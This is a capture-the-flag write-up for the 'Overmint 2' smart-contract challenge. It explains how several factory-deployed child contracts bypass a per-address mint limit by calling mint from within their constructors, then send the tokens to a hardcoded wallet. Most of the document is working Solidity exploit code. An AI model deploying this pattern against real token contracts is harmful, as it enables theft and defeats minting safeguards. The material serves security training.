# Overmint 2

Please review `Overmint` before continuing for context.

The solution here is much the same as the previous challenge, however small changes have been made. The main vulnerability remains the same (`Address.sol` from OZ).

### Some changegs:
- The victim contract now tracks tokens using the `balanceOf` functionality
- The `success` params require the sender to hold all tokens rather then accepting an address
- There are some slight spelling changes to victim contract name

## The attack contract:

You can see:
- The victim address is now passed in as a constructor arg
- The `Child` contract no longer transfer the token back to the `Factory` but to a specified wallet

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.16;

import "./AnatemToken2.sol";

contract AttackFactory {
    constructor(address _victim) {
        VICTIM_ADDR = _victim;
    }

    address public VICTIM_ADDR;

    function createAttackChildrenContracts() external {
        Child child2 = new Child(VICTIM_ADDR, 7);
        Child child3 = new Child(VICTIM_ADDR, 8);
        Child child4 = new Child(VICTIM_ADDR, 9);
        Child child5 = new Child(VICTIM_ADDR, 10);
        Child child1 = new Child(VICTIM_ADDR, 11);
    }
}

contract Child {
    constructor(address _victim, uint256 _tokenId) {

        address OWNER = 0x5f1bC8fD0059aa02a270d2e31375190cb4e156aF;
    
        AnteamToken anteamToken = AnteamToken(_victim);

        anteamToken.mint();
        anteamToken.transferFrom(address(this), OWNER, _tokenId);
    }
}
```

